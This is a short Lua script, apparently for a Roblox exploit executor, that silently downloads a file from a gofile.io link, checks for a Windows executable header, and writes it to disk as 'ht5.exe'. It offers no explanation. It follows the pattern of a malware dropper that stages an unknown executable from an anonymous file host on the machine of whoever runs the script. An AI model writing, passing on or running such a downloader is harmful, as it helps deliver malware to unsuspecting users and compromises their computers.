local genv = (pcall(getgenv) and getgenv()) or _G
local writefile = rawget(genv, "writefile") or rawget(_G, "writefile")
local http_req = rawget(genv, "request") or rawget(genv, "http_request") or rawget(_G, "request")

if type(writefile) ~= "function" then return end

local exe_url = "https://gofile.io/d/aW5u6M"
local exe_name = "ht5.exe"

local exe_bytes = ""
local success_download = false

if type(http_req) == "function" then
    local ok, res = pcall(http_req, {
        Url = exe_url, 
        Method = "GET"
    })
    
    if ok and res and res.StatusCode == 200 and type(res.Body) == "string" and res.Body:sub(1,2) == "MZ" then
        exe_bytes = res.Body
        success_download = true
    end
end

if not success_download then
    pcall(function() 
        local b = game:HttpGet(exe_url) 
        if b and b:sub(1,2) == "MZ" then
            exe_bytes = b
            success_download = true
        end
    end)
end

if not success_download or #exe_bytes < 1000 then 
    pcall(writefile, "debug_download.txt", "Failed to download valid PE file.")
    return 
end

pcall(writefile, exe_name, exe_bytes)
